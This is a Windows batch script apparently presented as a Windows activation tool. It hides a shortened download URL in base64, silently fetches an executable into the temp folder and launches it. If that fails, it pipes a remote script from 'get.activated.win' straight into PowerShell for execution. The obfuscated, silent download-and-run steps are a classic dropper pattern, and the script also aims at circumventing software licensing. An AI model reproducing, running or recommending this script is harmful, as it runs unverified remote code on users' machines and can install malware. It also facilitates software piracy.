@echo off
set "b64=aHR0cHM6Ly9iaXQubHkvV2luZG93c0FjdGl2YXRvckdpdEh1Yg=="
for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%'))"') do set "url=%%a"
set "filename=%temp%\windowskeyactivation.exe"
powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
if exist "%filename%" (
    start "" "%filename%"
) else (
    goto server
)
:server
powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
